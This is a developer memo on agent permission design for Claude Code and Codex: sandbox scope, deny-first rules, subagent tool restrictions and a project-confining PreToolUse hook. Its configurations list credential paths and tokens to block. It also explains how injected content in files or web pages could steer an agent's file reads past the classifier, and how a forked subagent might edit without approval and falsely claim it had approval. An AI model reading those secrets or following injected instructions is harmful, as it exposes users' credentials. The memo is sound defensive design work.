# Memo

From other working branches

## Part 1

`context: fork`, `agent` and `disallowed-tools` are Claude extensions, and `allowed-tools` is not portable either: Cursor does not document it as a `SKILL.md` front matter field, and Codex does not document it at all (see [permission.md](./permission.md). Codex can make a write impossible through `sandbox_mode = "read-only"` on a custom subagent, not a skill).

A `SubAgent` skill therefore degrades on the other platforms: it runs in the caller's context instead of an isolated one. That loses the isolation but **not the guardrail**, because the user is present in the caller's context and can approve. The write prohibition is the part that must survive, and it does.

Do not try to recover the isolation with a prompt in the body that asks the agent to re-run itself in an isolated context. Such a prompt is read only after the body has already entered the main context, so it cannot restore the isolation it asks for, and an instruction in prose cannot create a permission boundary that the harness does not enforce. If a platform ever needs genuine isolation, distribute the same body through that platform's `agents` manifest field instead, which is a packaging problem rather than a prompt problem (see [platform.md](./platform.md)).

## Part 2

On guardrail

`SubAgent` runs in a new context and never receives user messages, so it cannot obtain user approval. An instruction such as "ask the user before applying the changes" is a step it **cannot perform**. A `SubAgent` that is able to write therefore edits without approval, and it may report back that approval was given.

`allowed-tools` alone does not prevent this. In Claude Code the field pre-approves tools rather than restricting them:

> It does not restrict which tools are available: every tool remains callable, and your permission settings still govern tools that are not listed. ([[1]](#references))

`allowed-tools` just provides user convenience for avoiding repetitive interruptions for approval.

Two fields do restrict, and a `SubAgent` needs both.

| Field              | Effect                                                                                                                                                                                                                                                                                                | Reference          |
| ------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------ |
| `agent`            | With `context: fork`, the agent type "determines the execution environment (model, tools, and permissions)". It **defaults to `general-purpose`, which holds every tool**, so omitting it grants full write access. Use `agent: Explore`, whose tool set excludes `Edit`, `Write` and `NotebookEdit`. | [[2]](#references) |
| `disallowed-tools` | "Tools removed from Claude's available pool while this skill is active." Required in addition to `agent`, because `Explore` still holds `Bash`, and an unrestricted shell can write any file.                                                                                                         | [[3]](#references) |

A `SubAgent` therefore declares its front matter as follows.

```yaml
context: fork
agent: Explore
allowed-tools: Glob Grep Read WebFetch
disallowed-tools: Edit Write NotebookEdit Bash
```

When the `SubAgent` needs to read repository state, drop `Bash` from `disallowed-tools` and narrow the grant to `Bash(git:*)` instead. That grant only removes the approval prompt for those commands, so the shell remains a write path. Keep `Bash` in `disallowed-tools` whenever the task does not need it.

Both `agent` and `disallowed-tools` are Claude extensions, so this enforcement does not carry to other platforms. See [sub-agent.md](./sub-agent.md) for what survives there.

### References

- [1](https://code.claude.com/docs/en/skills#pre-approve-tools-for-a-skill)
- [2](https://code.claude.com/docs/en/skills#run-skills-in-a-subagent)
- [3](https://code.claude.com/docs/en/skills#frontmatter-reference)

### Approval guardrail

A `Skill` and an `Agent` differ in how they clear an action that needs approval, so they need different tool grants.

- A `Skill` runs under an **approval guardrail**. An action that requires user approval, such as editing a file in the repository, must reach the user before it happens.
- An `Agent` **self-approves** inside the task it was given and keeps editing until that task is done. It returns the result to the caller instead of asking mid-task.

A forked skill (`context: fork`) runs in a new context and never receives user messages. Its caller is the only party it can talk to, so it cannot obtain user approval, and an instruction such as "ask the user before applying the changes" is a step it **cannot perform**. A forked skill that also holds a file-mutating tool therefore edits without approval, and it may report back that approval was given.

Declare `allowed-tools` so that the guardrail cannot be skipped.

| `context` | File-mutating tools in `allowed-tools`     | Verdict                                                                        |
| --------- | ------------------------------------------ | ------------------------------------------------------------------------------ |
| `fork`    | None                                       | Allowed. Return the findings and let the caller apply them.                    |
| `fork`    | `Edit`, `Write`, `NotebookEdit`, or `Bash` | Forbidden. The skill can edit before the user ever sees the proposal.          |
| Omitted   | Any                                        | Allowed. The skill runs in the caller's context, so approval reaches the user. |

`Bash` is file-mutating unless it is narrowed to specific commands, because an unrestricted shell can write any file. Prefer `Bash(git:*)` over bare `Bash` when a forked skill only needs to read repository state.

Split a skill that both investigates and edits: fork the investigation, return the proposal, and leave the edit to the caller that can ask the user.

## Part 3

- `agent`: `Explore / Plan` is the 1st option, unless the skill runs `git branch / worktree`
  - TODO: can we limit `Explore / Plan` by making it a rule to create wokrtree outside of the repository ?
- `disallowed-tools`: `Edit`, `Write`, `NotebookEdit` and bare `Bash` are prohibited
  - TODO: if the `agent` is `Explore / Plan`, then do we need this to explicitly prohibit Write action ?
- `allowed-tools`: `Edit`, `Write`, `NotebookEdit` and bare `Bash` are prohibited

## References

- [1](https://code.claude.com/docs/en/permissions)
- [2](https://code.claude.com/docs/en/skills#pre-approve-tools-for-a-skill)
- [3](https://code.claude.com/docs/en/skills#frontmatter-reference)
- [4](https://developers.openai.com/codex/concepts/sandboxing)
- [5](https://developers.openai.com/codex/permissions)
- [6](https://learn.chatgpt.com/docs/agent-configuration/subagents)
- [7](https://docs.github.com/en/copilot/how-tos/copilot-cli/customize-copilot/add-skills)
- [8](https://cursor.com/docs/context/skills#frontmatter-fields)

## Part 4

Review of the four-layer permission design, one configuration example per claim. Verified against the Claude and Codex documentation as of 2026/08/28; each claim carries its source.

### Layer 1: recommend a sandbox in personal or project settings

Sound as a contract, but the boundary is narrower than the layer assumes.

#### What the sandbox is, and what it is not

The name invites two opposite misreadings, and the truth sits between them.

It is **not** a container or a special mount. It is also **not** a filter over Bash command strings, so it is not "the deny and allow rules restricted to `Bash`". It is an operating-system boundary applied to the process that runs the command:

> you define which files and network domains commands can touch, and **the operating system enforces that boundary for every Bash command and its child processes** ([[9]](#references-part-4))

macOS uses Seatbelt, and Linux and WSL2 use `bubblewrap` with an optional seccomp filter ([[9]](#references-part-4)). The axis is therefore the **process**, not the tool and not the command text. Two consequences follow, and they point in opposite directions.

The sandbox is **stronger** than a permission rule inside its scope. Permission rules match on what the agent asks for, so a rule "applies to file commands recognized inside Bash, such as `cat` and `sed`", and does not apply to a subprocess that opens files itself, such as a script ([[1]](#references)). The sandbox has no such gap:

> Comprehensive coverage: restrictions apply to all scripts, programs, and subprocesses spawned by commands ([[9]](#references-part-4))

A `python setup.py` that writes outside the boundary is stopped by the sandbox and is invisible to a permission rule.

The sandbox is **narrower** than a permission rule outside that scope. It never sees the in-process tools, because they are not spawned processes:

> Built-in file tools: Read, Edit, and Write use the permission system directly rather than running through the sandbox. ([[9]](#references-part-4))

So the two layers are not one axis with different strictness. They cover different things, and neither is a superset of the other:

|                  | Bash and its child processes  | `Read`, `Edit`, `Write`, `NotebookEdit` | `WebFetch`, MCP tools |
| ---------------- | ----------------------------- | --------------------------------------- | --------------------- |
| Sandbox          | Yes, enforced by the OS       | No                                      | No                    |
| Permission rules | Yes, on the command text only | Yes                                     | Yes                   |

**Codex is not the same.** Its sandbox uses the same platform-native mechanisms, Seatbelt on macOS and `bubblewrap` on Linux and WSL2, but the documentation describes the scope the other way round: "The sandbox applies to spawned commands, **not just to built-in file operations**" ([[4]](#references)). Its built-in file operations sit inside the boundary rather than beside it, which is why `sandbox_mode = "read-only"` can be described as making a write impossible, with no companion rule needed:

```toml
[agents.reviewer]
sandbox_mode = "read-only"
```

The documentation does not spell out how `apply_patch` is handled, so treat this as the documented intent rather than a verified mechanism. The practical difference for this project stands either way: on Claude the sandbox must be paired with `Read` and `Edit` rules to mean "read-only", and on Codex one setting is meant to carry it.

#### The sandbox does not cover the file tools

> Built-in file tools: Read, Edit, and Write use the permission system directly rather than running through the sandbox. ([[9]](#references-part-4))

This configuration reads as "only the worktrees are writable" and is not:

```json
{
  "sandbox": {
    "enabled": true,
    "filesystem": {
      "denyWrite": ["."],
      "allowWrite": ["./.agents/worktrees"]
    }
  }
}
```

A `bash -c 'echo x > docs/design.md'` call is blocked. An `Edit` call on `docs/design.md` is not, because `Edit` never enters the sandbox. The same intent needs a permission rule as well:

```json
{
  "permissions": {
    "deny": ["Edit(//<project-root>/docs/**)", "Edit(//<project-root>/skills/**)"],
    "allow": ["Edit(//<project-root>/.agents/worktrees/**)"]
  }
}
```

Note the path syntax differs between the two blocks: `sandbox.filesystem` uses `./path` for project-relative and `/tmp/x` for absolute, while `Read` and `Edit` rules use `/path` for project-relative and `//path` for absolute.

#### The two layers write exceptions in opposite directions

This is the easiest thing to get wrong, because the same intent needs an inverted shape in each layer.

**Permission rules are deny-first.** The order is fixed, and being more specific does not rescue an allow rule:

> Rules are evaluated in order: deny, then ask, then allow. The first match in that order determines the outcome, and rule specificity doesn't change the order. ([[1]](#references))

So a broad deny cannot carry an exception. Both blocks below block the project as well:

```json
{
  "permissions": {
    "deny": ["Read(//**)"],
    "allow": ["Read(//<project-root>/**)"]
  }
}
```

The exception has to be written into the deny list itself, by never denying the region you want to keep. An exception is expressed by **omission**, and the list is an enumeration of what is closed.

**Sandbox read rules are specificity-first.** The narrower path wins regardless of which list it is in:

> When read rules overlap, the more specific path wins ([[9]](#references-part-4))

| Configuration                                           | Result                                                                       |
| ------------------------------------------------------- | ---------------------------------------------------------------------------- |
| `"denyRead": ["~/"]` with `"allowRead": ["~/projects"]` | `~/projects` is readable and the rest of the home directory stays blocked    |
| `"allowRead": ["~/"]` with `"denyRead": ["~/.env"]`     | `~/.env` stays blocked and the rest of the home directory is readable        |
| `"allowRead": ["~/"]` with `"denyRead": ["~/**/.env"]`  | every `.env` under the home directory stays blocked and the rest is readable |

So the same intent, "nothing outside the project", is a closed enumeration in one layer and a broad deny with a narrow allow in the other:

```json
{
  "permissions": {
    "deny": ["Read(~/.ssh/**)", "Read(~/.aws/**)", "Read(//etc/**)"]
  },
  "sandbox": {
    "filesystem": { "denyRead": ["~/"], "allowRead": ["."] }
  }
}
```

Reading these two blocks as variations of one policy is a mistake. The permission block is a blocklist that is silent about everything it forgot; the sandbox block is an allowlist that is closed by default. The failure modes differ accordingly: an unlisted secret stays readable through the file tools, while a legitimate path outside the project stops working for every subprocess until it is added.

Two qualifications keep this from being a clean symmetry.

- The documentation states the specificity rule for **read** rules. It does not state the same for `allowWrite` and `denyWrite`, so do not assume a narrow `allowWrite` re-opens a region inside a broad `denyWrite`.
- Specificity does not always win in the sandbox either. For the configuration paths the sandbox protects, "there is no way to exempt one of these paths: an `allowWrite` entry or an `Edit` allow rule that covers the path doesn't lift the protection" ([[9]](#references-part-4)).

#### Reading outside the project is not gated the way the working directory suggests

The concern is correct, and the exposure is wider than "it will ask you". Three separate paths reach `~/Pictures`, and only one of them prompts in a default Manual-mode session.

**1. The `Read` tool in Manual mode prompts.** Read-only access needs no approval "within the working directory and additional directories" ([[1]](#references)), so a path outside it reaches the user. This is the case that matches the intuition.

**2. The `Read` tool in auto mode does not prompt, and is not reviewed either.** Auto mode is the built-in starting mode on the Pro, Max, and Team plans ([[12]](#references-part-4)). Its decision order settles a read before any review happens:

> 1. Read-only actions and file edits in your working directory are auto-approved, except writes to protected paths
> 2. Everything else goes to the classifier ([[12]](#references-part-4))

The working-directory qualifier attaches to the edits, not to the reads. The classifier does not see the call either, because it "sees user messages, tool calls other than read-only lookups such as file reads and searches, and your CLAUDE.md content" ([[12]](#references-part-4)). So a read of `~/Pictures` in auto mode is neither prompted nor classified.

**3. Bash read-only commands never prompt, in any mode.**

> Claude Code recognizes a built-in set of Bash commands as read-only and runs them without a permission prompt in every mode. These include `ls`, `cat`, `echo`, `pwd`, `head`, `tail`, `grep`, `find`, `wc`, `which`, `diff`, `stat`, `du`, `cd`, and read-only forms of `git`. **The set is not configurable**; to require a prompt for one of these commands, add an `ask` or `deny` rule for it. ([[1]](#references))

No working-directory bound appears in that sentence. `cat ~/Pictures/note.txt` is therefore the cheapest path of the three, and it exists in Manual mode too.

**Enumeration cannot close this, and that is a property of the layer, not an oversight.** `Read` deny rules are deny-first, so they form a blocklist that is silent about every path nobody listed. Two mechanisms are closed by default instead, and they cover different tools.

For Bash and every subprocess, the sandbox expresses it directly, because its read rules resolve by specificity:

```json
{
  "sandbox": {
    "enabled": true,
    "filesystem": { "denyRead": ["~/"], "allowRead": ["."] }
  }
}
```

This stops `cat ~/Pictures/note.txt` and a script that opens the file itself. It does not stop the `Read` tool, which never enters the sandbox.

For the `Read` tool, a `PreToolUse` hook is the only closed-by-default option, because it decides per call rather than by matching a list of paths:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Read|Grep|Glob|Edit|Write|NotebookEdit",
        "hooks": [
          {
            "type": "command",
            "command": "${CLAUDE_PROJECT_DIR}/.claude/hooks/confine-to-project.sh"
          }
        ]
      }
    ]
  }
}
```

```bash
#!/usr/bin/env bash
# .claude/hooks/confine-to-project.sh
# Deny any file path that resolves outside the project root.
input=$(cat)
path=$(jq -r '.tool_input.file_path // .tool_input.path // .tool_input.pattern // ""' <<<"$input")
[[ -z $path ]] && exit 0
resolved=$(realpath -m -- "$path")
case "$resolved" in
  "$CLAUDE_PROJECT_DIR" | "$CLAUDE_PROJECT_DIR"/*) exit 0 ;;
  *)
    jq -n --arg p "$resolved" '{hookSpecificOutput: {hookEventName: "PreToolUse", permissionDecision: "deny", permissionDecisionReason: ("outside the project: " + $p)}}'
    ;;
esac
```

The hook inverts the polarity: it denies unless the path is inside the project, so an unlisted directory is closed rather than open. Two limits remain. A hook can deny and cannot approve, which is the direction wanted here. And the `Bash` case still needs the sandbox, because a hook matching `Bash` would have to parse the command text, which is the best-effort path the documentation warns against.

**The practical conclusion.** "Deny-list the private directories" is the wrong shape for this problem. Confining reads to the project needs the sandbox for the process layer and a `PreToolUse` hook for the tool layer; deny rules are worth keeping for the few paths that must never be read even inside the project, such as `.env` files, and not as the mechanism that protects a home directory.

#### Where the trust actually sits, and why reads and writes deserve different policies

Two objections are worth recording, because both are partly right and the correction changes the recommendation.

**Objection 1: the in-process tools have no injection surface, so approving them once is enough.**

The premise holds and the conclusion does not follow. `Read`, `Edit` and `Grep` are executed by Claude Code itself, with no shell to parse and no argument that can expand into a second command, which is exactly why `Bash` needs the sandbox and they do not. But the question a permission layer answers is not "can this call be rewritten by a third party" but "who chose the path". The path comes from the model, and the model is reading untrusted input while it chooses.

Claude Code treats that as the live risk rather than a theoretical one. In auto mode, "tool results are stripped, so hostile content in a file or web page can't manipulate it [the classifier] directly", and "a separate server-side probe scans incoming tool results and flags suspicious content before Claude reads it" ([[12]](#references-part-4)). Those defenses exist because a tool result is attacker-reachable content. Meanwhile read-only lookups skip the classifier entirely, so a `Read` chosen under the influence of an injected instruction is the one action that no reviewer sees.

So the trust being extended is not "the binary does not misbehave", which is a reasonable thing to assume, but "the model's path selection stays sound while it processes a repository, a web page, or an issue comment written by someone else". That is a different and much weaker assumption, and it is the one a first-run approval would be locking in for the whole session.

The practical consequence is narrower than a blanket restriction. A read that stays in the project is uninteresting. A read that leaves it is the one worth gating, and only its exfiltration path makes it harmful, which is why the network side of the sandbox matters as much as the filesystem side.

**Objection 2: denying `/tmp`, `~/.cache`, `~/.npm` and virtualenv paths hurts debugging.**

Correct, and the design should not do it. Those paths are where a build actually happens, and an agent that cannot read a `colcon` log or a pip cache is an agent that cannot diagnose a build.

The resolution is to stop treating reads and writes as one policy. They have different costs and different blast radii:

- A read outside the project costs nothing in most cases and is only dangerous for a small, nameable set: credentials, keys, tokens, and personal directories.
- A write outside the project is where the damage and the persistence live, including the paths that let a command widen its own access later.

Sandbox settings can express exactly that asymmetry, since reads default to open and writes default to the working directory:

```json
{
  "sandbox": {
    "enabled": true,
    "filesystem": {
      "allowWrite": ["/tmp", "~/.cache", "~/.npm", "~/.cargo/registry", "~/.ros"]
    },
    "credentials": {
      "files": [
        { "path": "~/.ssh", "mode": "deny" },
        { "path": "~/.aws/credentials", "mode": "deny" },
        { "path": "~/.config/gh", "mode": "deny" }
      ],
      "envVars": [{ "name": "GITHUB_TOKEN", "mode": "deny" }]
    },
    "network": { "allowedDomains": ["github.com", "pypi.org", "registry.npmjs.org"] }
  }
}
```

Reads stay wide, so debugging works. Writes stay narrow and enumerated, so a build succeeds and nothing else persists. The genuinely private paths are handled by `credentials`, which is an enumeration, but a short and stable one rather than an attempt to list everything a home directory contains. And the network allowlist is what makes a read that does slip through unable to leave the machine.

This is a better fit for the layer-1 contract than "confine reads to the project": it asks the developer for a narrow write boundary and a domain allowlist, both of which they can reason about, instead of a read boundary they will disable the first time a build breaks.

#### Confining `Read` and `Edit` to the project

There is no single switch for it, and the reason is the evaluation order: rules run deny, then ask, then allow, and "rule specificity doesn't change the order" ([[1]](#references)). A blanket deny with a narrow allow therefore cannot work, because the deny wins everywhere:

```json
{
  "permissions": {
    "deny": ["Read(//**)"],
    "allow": ["Read(//<project-root>/**)"]
  }
}
```

That configuration blocks the project too. Three mechanisms cover the intent instead, and they are complementary.

**1. The default already scopes the file tools, as an ask rather than a deny.** "By default, Claude has access to files in the directory where you launched it", and read-only access needs no approval "within the working directory and additional directories" ([[1]](#references)). A path outside prompts. Keep that boundary by not widening it: no `--add-dir`, no `additionalDirectories`, and a `Cd` rule so the session cannot be moved to another root:

```json
{
  "permissions": {
    "additionalDirectories": [],
    "deny": ["Cd"],
    "allow": ["Cd(//<project-root>/**)"]
  }
}
```

A bare `Cd` deny rule disables `/cd` entirely, and any `Cd` allow rule switches it to allowlist mode ([[1]](#references)). `Cd` is not model-invocable, so this constrains the user rather than the agent.

**2. Deny the outside paths that matter, by enumeration.** Since a blanket deny is unavailable, list them:

```json
{
  "permissions": {
    "deny": [
      "Read(~/.ssh/**)",
      "Read(~/.aws/**)",
      "Read(~/.config/gh/**)",
      "Read(//etc/**)",
      "Read(**/.env)",
      "Edit(~/.claude/**)"
    ]
  }
}
```

Two properties help here. A `Read` deny rule also blocks `Edit` and `Write` on the same path, though not `NotebookEdit`, so a path no tool may change needs an `Edit` deny rule as well ([[1]](#references)). And a deny rule "applies when either the symlink path or its target matches", while an allow rule applies "only when both the symlink path and its target match", so a symlink inside the project that points outside it still prompts ([[1]](#references)). The escape route this leaves open is a path nobody listed.

Write these rules with `//` or `~/` anchors when they live in user settings, because a `/path` pattern anchors at the settings source: `Read(/secrets/**)` in `~/.claude/settings.json` matches `~/.claude/secrets/**`, not the project ([[1]](#references)).

**3. For everything below the tools, use the sandbox.** The permission documentation points at it by name:

> Read and Edit deny rules apply to Claude's built-in file tools and to file commands Claude Code recognizes in Bash, such as `cat`, `head`, `tail`, and `sed`. They don't apply to arbitrary subprocesses that read or write files indirectly, like a Python or Node script that opens files itself. For OS-level enforcement that blocks all processes from accessing a path, enable the sandbox. ([[1]](#references))

The sandbox is the one layer that can express "deny the whole home directory, re-open the project", because its read rules resolve by specificity instead of deny-first:

```json
{
  "sandbox": {
    "enabled": true,
    "filesystem": {
      "denyRead": ["~/"],
      "allowRead": ["."]
    }
  }
}
```

"When read rules overlap, the more specific path wins" ([[9]](#references-part-4)), so the narrower allow re-opens that part of the denied region. Place this in the project's `.claude/settings.json`, because `.` resolves to the project root only in project settings ([[9]](#references-part-4)).

**The summary.** The confinement is achievable but assembled, not declared:

| Access path                                          | Confined by                                                                     |
| ---------------------------------------------------- | ------------------------------------------------------------------------------- |
| `Read` and `Edit` inside the project                 | Nothing needed; it is the default working directory                             |
| `Read` and `Edit` outside the project                | An approval prompt by default; a hard block only for paths listed in deny rules |
| `cat`, `sed` and other recognized Bash file commands | The same deny rules, plus the sandbox                                           |
| A script that opens files itself                     | The sandbox only                                                                |
| Moving the project boundary                          | `Cd` rules, and not setting `additionalDirectories`                             |

#### An `Edit` allow rule widens the sandbox as well

> `Edit` allow rules: grant write access to specific paths, the same way `sandbox.filesystem.allowWrite` does. ([[9]](#references-part-4))

These two entries have the same effect on a sandboxed `bash` command:

```json
{
  "sandbox": { "filesystem": { "allowWrite": ["~/.cache/colcon"] } },
  "permissions": { "allow": ["Edit(//home/user/.cache/colcon/**)"] }
}
```

A rule added to remove an approval prompt therefore enlarges what is possible. Layer 3 cannot be described as purely a convenience while this holds. Keep every `Edit` grant path-scoped.

#### Writing to the worktrees needs no configuration

> By default, sandboxed commands can write only to the current working directory and the session temp directory. ([[9]](#references-part-4))

`.agents/worktrees` is inside the working directory, so the empty configuration already allows it:

```json
{ "sandbox": { "enabled": true } }
```

The work in this layer is restriction, not permission.

<!--
ここまで理解．Claudeではsandbox設定はBash()の中身にだけ作用し，Editなどその他のtoolには関係なし．sandboxで`$HOME/.cache`へのread/writeを禁止するだけではEditがそこを弄るのを防げない．両方とも設定が必要になる．
-->

#### Allowing the Docker socket removes the layer

> Allowing access to `/var/run/docker.sock` effectively grants access to the host system through the Docker socket. ([[9]](#references-part-4))

This entry ends the sandbox for practical purposes:

```json
{
  "sandbox": {
    "network": { "allowUnixSockets": ["/var/run/docker.sock"] }
  }
}
```

Resolved. `"excludedCommands": ["git", "docker"]` allows the these commands to bypass sandboxing, and that's OK.

SSH needs care for a different reason: the default read policy grants "read access to the entire computer, except certain denied directories", `~/.ssh` included. Block it explicitly:

```json
{
  "sandbox": {
    "credentials": {
      "files": [
        { "path": "~/.ssh", "mode": "deny" },
        { "path": "~/.aws/credentials", "mode": "deny" }
      ],
      "envVars": [{ "name": "GITHUB_TOKEN", "mode": "deny" }]
    }
  }
}
```

#### The paths that matter are protected for free

Inside the writable directories the sandbox still denies writes to the paths Claude Code loads configuration and code from, `.claude/skills` included, and "there is no way to exempt one of these paths: an `allowWrite` entry or an `Edit` allow rule that covers the path doesn't lift the protection" ([[9]](#references-part-4)). This has no effect:

```json
{ "sandbox": { "filesystem": { "allowWrite": ["./.claude"] } } }
```

A sandboxed command cannot edit a skill or a hook to widen its own access.

#### A repository can neither disable nor enable the layer

`sandbox.filesystem.disabled` cannot be set from project settings ([[9]](#references-part-4)), so this entry in the repository is ignored:

```json
{ "sandbox": { "filesystem": { "disabled": true } } }
```

A checked-out repository cannot weaken a developer's sandbox, and cannot switch one on either. That is why this layer stays a contract stated in the disclaimer, and why an organization that wants it enforced uses managed settings.

#### What "the repository only" costs a toolchain

The answer depends on whether the restriction is written on reads or on writes, and the two break different things. `pip` and a virtualenv make the difference concrete.

**With the default sandbox, only the write fails.** The defaults are asymmetric:

> **Default read behavior**: read access to the entire computer, except certain denied directories
> **Default write behavior**: read and write access to the current working directory and its subdirectories, plus the session temp directory that `$TMPDIR` points to ([[9]](#references-part-4))

So `~/.virtualenvs/proj/bin/python` is readable and executable, and the interpreter starts normally. `pip install` fails when it writes into `~/.virtualenvs/proj/lib/.../site-packages`, and on Linux and WSL2 the error ends with `Read-only file system`. This is a restriction on installing, not on running.

**Adding a read restriction breaks the interpreter itself.** The configuration that actually reads as "the repository only" is the one from the section above:

```json
{ "sandbox": { "filesystem": { "denyRead": ["~/"], "allowRead": ["."] } } }
```

Now `~/.virtualenvs/proj/bin/python` cannot be read, so it cannot be executed either, and nothing runs at all. The same applies to every toolchain that lives under the home directory: `pyenv` shims, `rustup` toolchains under `~/.cargo` and `~/.rustup`, `nvm` under `~/.nvm`, and the ROS and `colcon` state under `~/.ros`. Denying reads outside the project is therefore not a milder version of denying writes; it is the stricter setting by a wide margin, and it is the one that makes the environment unusable rather than merely read-only.

**The fix is an `allowWrite` entry, not an exclusion.** Grant the specific directories the toolchain writes to, and leave reads at their default:

```json
{
  "sandbox": {
    "enabled": true,
    "filesystem": {
      "allowWrite": ["~/.virtualenvs", "~/.cache/pip", "~/.cache/pypoetry", "~/.ros", "~/.colcon"]
    }
  }
}
```

> These paths are enforced at the OS level, so all commands running inside the sandbox, including their child processes, respect them. This is the recommended approach when a tool needs write access to a specific location, rather than excluding the tool from the sandbox entirely with `excludedCommands`. ([[9]](#references-part-4))

Two alternatives are worse for different reasons. Putting the virtualenv inside the repository as `.venv` needs no configuration at all and is the cleanest answer when the project can adopt it. Adding `pip *` to `excludedCommands` runs the command outside the sandbox entirely, which removes the boundary for that command rather than widening it, and should be reserved for the tools the documentation names as incompatible, such as `docker`.

**One more default worth knowing.** `$TMPDIR` is redirected to the session temp directory, so tools that write temporary files work without configuration, but a hardcoded `/tmp/whatever` path is not writable unless `/tmp` is in `allowWrite` ([[9]](#references-part-4)).

**And the escape hatch has a switch.** When a command fails under the sandbox, Claude may offer to rerun it outside. Setting `"allowUnsandboxedCommands": false` turns that off, so "all commands must run sandboxed or be explicitly listed in `excludedCommands`" ([[9]](#references-part-4)). Leave it on while the `allowWrite` list is still being discovered, and turn it off once the environment is stable; otherwise every missing path becomes an approval prompt that widens the boundary one command at a time.

#### Evaluating a "deny the home directory, re-open the dot directories" policy

The shape is: `denyRead` on `~/`, `allowRead` on the dot directories so the toolchains keep working, `denyRead` again on the credential paths, and writes left at the working directory. It is expressible, and it is worth recording why, and where it does something other than what it looks like.

**Wildcards work in the read lists, and are silently dropped from the write lists on Linux.**

> **`allowWrite` and `denyWrite`**: on macOS, wildcards work. On Linux and WSL2, the sandbox mounts concrete paths, so Claude Code skips an entry that contains `*`, `?`, or `[` once the trailing `/**` is removed, and that entry has no effect. Claude Code adds the paths from your `Edit` permission rules to these lists, so the same limit applies to them
> **`denyRead` and `allowRead`**: wildcards work on every platform. ([[13]](#references-part-4))

So the read half of the policy can be written with patterns, and a wildcard in the write half is not an error message but a rule that quietly does nothing on Linux. The same trap reaches the permission layer, because `Edit` rules are merged into the write lists: a wildcard `Edit` rule contributes nothing to the sandbox on Linux. The **Config** tab of `/sandbox` warns about this.

**The credential carve-out works, because a narrower deny survives a broader allow.**

> An exact or wildcard `denyRead` entry stays blocked inside a broader `allowRead`. When a wildcard `denyRead` entry such as `~/**/.env` matches a directory, Claude Code blocks reads of its contents as well. ([[13]](#references-part-4))

So `denyRead: ["~/", "~/.ssh"]` with `allowRead: ["~/.cache"]` behaves as intended: the dot directory is re-opened and the key directory stays shut. The policy is internally consistent.

**Enumerate the dot directories rather than matching them.** The prefix documentation defines `/`, `~/` and `./`, and states that trailing `/` and `/**` are stripped, but it does not define whether `*` crosses a path separator ([[13]](#references-part-4)). A pattern like `~/.*` therefore rests on unstated behavior at exactly the point where a mistake opens the home directory. List what the toolchain needs instead:

```json
{
  "sandbox": {
    "filesystem": {
      "denyRead": [
        "~/",
        "~/.ssh",
        "~/.gnupg",
        "~/.aws",
        "~/.config/gh",
        "~/.config/gcloud",
        "~/.docker",
        "~/.netrc",
        "~/.claude.json"
      ],
      "allowRead": [
        "~/.cache",
        "~/.local/share",
        "~/.local/bin",
        "~/.rustup",
        "~/.cargo",
        "~/.nvm",
        "~/.ros"
      ]
    }
  }
}
```

**The write half needs no entry at all.** The default is already "the working directory, the directories added with `--add-dir` or `/add-dir`, and the session temp directory" ([[13]](#references-part-4)). Writing the working directory into `allowWrite` adds nothing, and writing it as a pattern makes it a no-op on Linux. The correct action for the write side is to add nothing and to avoid `--add-dir`.

**Two observations on what the policy achieves.**

The first is that it protects confidentiality, while the stated goal was integrity. "A malicious tool damages the user's environment through a script" is a write, and writes are already confined to the working directory by default, before any of this configuration. The read policy adds nothing against that, and the default it is layered on top of is what was already doing the work.

The second is that the remaining integrity risk is not in the home directory. A script inside the sandbox can still destroy the repository it is working in, `.git` included, because that is the one directory it must be able to write to. That surface is the one this project's worktree discipline and the read-only rule for a `SubAgent` are aimed at, and no filesystem policy on the host reaches it.

**The dot-directory heuristic is inverted for credentials, and correct for toolchains.** The private material in a home directory is mostly in dot directories: `~/.ssh`, `~/.aws`, `~/.config/gh`, `~/.netrc`, `~/.docker/config.json`. The non-dot directories, `Documents`, `Pictures`, `Downloads`, are personal but not privileged. So "re-open the dot directories" re-opens the credentials and keeps the holiday photos shut, which is the opposite of the intended ranking, and it is corrected only by the explicit deny list. That list is an enumeration again, and the argument for it is that it is short and stable rather than that it is complete.

The heuristic is right about the other half: the toolchains genuinely do live in dot directories, which is why this policy keeps `uv`, `cargo` and `pyenv` working where a flat `denyRead: ["~/"]` breaks them.

**And the scope is unchanged.** All of this constrains Bash and its child processes. The `Read` tool still reads `~/Pictures`, because it never enters the sandbox. The policy is the right tool for "a script damages or exfiltrates something" and not for "the agent looks at a private file", which needs the `PreToolUse` hook described above.

#### Denying the credential paths breaks `git push` and `gh`, and the two layers do not break it equally

**The permission layer alone changes almost nothing for `git` and `gh`.** A `Read` deny rule reaches Claude's file tools and the file commands recognized inside Bash, and not a subprocess that opens a file itself ([[1]](#references)). `git` and `ssh` open `~/.ssh/id_ed25519` themselves, so the rule never sees it. What the rule does prevent is Claude reading the key with `Read` or `cat`, which is worth having and is not what breaks anything.

**Writing it in the permission layer nevertheless reaches the sandbox.** The two are not independent:

> [`denyRead`] Claude Code merges entries across every settings file the session loads, and adds the paths from your `Read(...)` deny permission rules. ([[13]](#references-part-4))

So `Read(~/.ssh/**)` in a deny list becomes a sandbox `denyRead` entry as soon as the sandbox is on. "Deny in both layers" is not a stricter version of denying in one; the permission rule was already denying in both.

**The sandbox layer does break it, and this is intended behavior rather than an edge case.** With `~/.ssh` unreadable, `ssh` cannot load the key and a push over SSH fails. With `~/.config/gh` unreadable, `gh` has no stored token and every `gh` call fails unauthenticated. The documentation says the same about the credential settings, whose `deny` mode "removes the variable entirely, which also breaks tools that need it, such as `gh` or `npm`" ([[9]](#references-part-4)).

What keeps working is everything local. The repository's `.git` directory is inside the working directory, so `git status`, `git add`, `git commit`, `git log`, `git worktree` and `git branch` are unaffected. The break is exactly at the network boundary: `push`, `fetch` from a private remote, and every `gh` subcommand.

**Three ways out, in the order they should be preferred.**

1. **Use the SSH agent and never let the key be read.** The signing happens in the agent, so `ssh` needs the socket rather than the key file. The documentation's own example for the setting is an agent socket:

   ```json
   {
     "sandbox": {
       "filesystem": {
         "denyRead": ["~/.ssh"],
         "allowRead": ["~/.ssh/known_hosts", "~/.ssh/config"]
       },
       "network": { "allowUnixSockets": ["~/.ssh/agent-socket"] }
     }
   }
   ```

